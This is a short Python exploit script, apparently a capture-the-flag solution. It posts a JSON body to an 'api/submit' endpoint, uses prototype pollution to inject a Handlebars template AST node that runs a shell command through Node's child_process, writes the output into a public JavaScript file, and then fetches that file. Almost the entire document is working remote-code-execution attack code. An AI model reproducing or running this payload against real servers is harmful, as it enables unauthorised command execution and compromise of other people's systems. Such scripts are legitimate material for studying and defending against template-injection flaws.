#!/usr/bin/python3

import requests

def connect():
    url = 'http://localhost:1337'
    url = "http://46.101.14.236:30843/"
    submit = "api/submit"
    out = "static/js/main.js"

    headers = { 
        'Content-Type' : 'application/json', 
        }

    r = requests.post(url + submit, json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`ls >> /static/js/main.js`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })

    r2 = requests.get(url + out, headers=headers)

    print(r.status_code)
    print(r.text)
    print(r2.text)
    
if __name__ == '__main__':
    connect()